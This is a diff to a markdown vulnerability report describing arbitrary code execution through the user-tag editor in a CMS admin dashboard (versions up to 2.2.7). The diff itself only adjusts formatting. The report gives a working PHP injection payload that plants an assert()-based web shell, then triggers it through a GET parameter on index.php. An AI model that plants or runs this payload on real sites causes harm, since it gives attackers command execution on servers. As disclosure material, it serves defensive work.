@@ -187,6 +187,7 @@ Vulnerability fix recommendations:
 use a strong data encryption method.
 
 **[4] Arbitrary code execution in the admin dashboard (<=2.2.7)**
+
 in \admin\editusertag.php
 
 ![26.png](./img/26.png)
@@ -218,9 +219,9 @@ go to /admin/listusertags.php?_sk_=2e70dc0836332261d5c
 select a tag to edit and add as follows
 
 ![31.png](./img/31.png)
+
 ```
-}
-if(isset($_GET['action'])) @assert($_GET['action']);/*```
+}if(isset($_GET['action'])) @assert($_GET['action']);/*```
 
 then visit /index.php?action=phpinfo()
 the variable ```action``` is the command to be executed
